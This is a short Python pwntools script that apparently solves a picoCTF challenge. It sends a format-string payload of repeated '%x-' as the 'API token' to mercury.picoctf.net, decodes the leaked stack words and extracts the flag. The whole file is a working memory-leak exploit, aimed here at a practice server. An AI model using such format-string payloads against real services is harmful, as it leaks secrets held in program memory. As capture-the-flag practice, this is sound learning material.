from pwn import *

connect = remote('mercury.picoctf.net', 6989)
payload = b'%x-' * 30 + b'\n'

connect.recvuntil(b'View my portfolio\n')
connect.send(b'1\n')

connect.recvuntil(b'What is your API token?\n')
connect.send(payload)

stack = connect.recvlines(2)[1].decode('UTF-8')

flag = ''

for s in stack.split('-'):
    if len(s) == 8:
        ba = bytearray.fromhex(s)[::-1]
        for b in ba:
            if b >= 0 and b <= 127:
                flag += chr(b)

print(f'\nFlag: {flag[flag.index("pico"):flag.index("}") + 1]}\n')